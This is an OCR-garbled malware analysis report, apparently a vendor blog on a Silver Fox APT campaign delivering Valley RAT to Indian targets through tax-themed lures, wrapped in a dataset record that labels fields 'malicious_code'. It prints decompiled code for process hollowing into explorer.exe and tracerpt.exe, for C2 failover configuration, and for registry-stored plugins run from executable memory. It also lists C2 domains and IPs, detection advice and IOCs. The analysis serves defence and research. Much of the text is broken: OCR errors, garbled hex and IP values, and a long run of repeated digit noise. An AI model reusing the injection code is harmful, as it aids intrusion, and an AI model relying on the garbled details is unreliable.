*)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "sub_405D70(L\"p1:\",Source,0);sub_405D70(L\"o1:\",Source_2,0);sub_405D70(L\"t1:\",0,&dword_41CA30);sub_405D70(L\"p2:\",Source_0,0);sub_405D70(L\"o2:\",Source_1,0);sub_405D70(L\"t2:\",0,&dword_41CC70);sub_405D70(L\"p3:\",Source_3,0);sub_405D70(L\"o3:\",Source_4,0);sub_405D70(L\"t3:\",0,&dword_41CEB0);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "cbData = 0;\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData);\nif ( cbData > 0xA )\nmemset(\na0Db1Lk1Hs0Ld0L,\n0,\n0x7D0u);\nRegQueryValueExW(\nphkResult,\nL\"IpDate\",\n0,\n&Type,\n(LPBYTE)a0Db1Lk1Hs0Ld0L,\n&cbData);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/